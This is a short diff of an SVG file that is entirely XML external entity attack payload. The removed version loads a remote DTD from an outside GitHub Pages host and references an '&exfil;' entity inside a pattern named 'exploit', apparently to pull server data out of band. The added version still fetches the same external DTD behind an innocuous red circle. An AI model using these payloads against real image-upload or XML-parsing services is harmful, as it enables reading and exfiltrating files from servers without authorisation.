@@ -1,14 +1,8 @@
-<!DOCTYPE svg [
-<!ENTITY % outside SYSTEM "https://panch0r3d.github.io/AZ_xxe2.dtd">
-%outside;
-]>
-<svg>
-<defs>
-<pattern id="exploit">
-  <text x="10" y="10">
-    &exfil;
-  </text>
-  <rect x="0" y="150" height="10" width="300" style="fill: black"/>
-</pattern>
-</defs>
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+"https://panch0r3d.github.io/AZ_xxe2.dtd">
+
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
+<circle cx="100" cy="50" r="40" stroke="black"
+stroke-width="2" fill="red" />
 </svg>
